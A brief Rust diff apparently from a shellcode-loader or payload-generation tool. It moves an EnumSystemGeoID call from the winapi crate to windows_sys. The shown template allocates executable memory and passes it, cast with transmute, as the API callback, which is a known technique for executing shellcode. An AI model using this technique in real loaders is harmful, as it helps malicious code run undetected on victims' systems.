@@ -10,7 +10,7 @@ impl Technique for EnumSystemGeoId {
         let body = r#"
         let addr = syscall_alloc_exec(&vec);
         if addr.is_null() { return; }
-        winapi::um::winnls::EnumSystemGeoID(
+        windows_sys::Win32::Globalization::EnumSystemGeoID(
             16,
             0,
             Some(std::mem::transmute(addr)),
